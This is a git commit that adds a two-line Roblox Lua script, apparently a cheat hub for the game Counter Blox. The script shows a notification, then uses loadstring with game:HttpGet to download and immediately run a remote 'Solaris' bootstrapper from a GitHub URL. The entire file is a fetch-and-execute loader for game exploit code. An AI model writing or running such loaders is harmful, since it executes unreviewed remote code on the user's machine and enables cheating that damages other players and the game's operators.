764044a03cb01b7d30ab7178f8e913abfbf2da21
Scaroontop <162757246+Scaroontop@users.noreply.github.com>
2025-01-07 12:25:07 -0500

    Create Zenexhub.lua

---
+++ Counterblox/Zenexhub.lua
@@ -0,0 +1,2 @@
+game:GetService("StarterGui"):SetCore("SendNotification",{Title = "Scripts",Text = "There is only one script for this game Executing Solaris." ,Duration = 10, Icon = "rbxthumb://type=Asset&id=9649923610&w=150&h=150"})
+loadstring(game:HttpGet("https://raw.githubusercontent.com/toasty-dev/pissblox/main/solaris_bootstrapper.lua",true))()
